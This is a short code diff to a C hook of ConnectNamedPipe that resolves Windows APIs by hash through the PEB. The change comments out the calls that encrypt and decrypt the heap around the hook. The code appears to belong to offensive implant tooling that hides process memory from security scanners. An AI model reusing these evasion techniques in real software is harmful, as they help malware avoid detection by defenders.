@@ -73,7 +73,7 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
 
 	/* Encrypt the heap */
-	HeapEncryptDecrypt( &Key, sizeof( Key ) );
+	//HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	if ( lpOverlapped != NULL ) 
 	{
@@ -161,7 +161,7 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	};
 
 	/* Decrypt the heap */
-	HeapEncryptDecrypt( &Key, sizeof( Key ) );
+	//HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
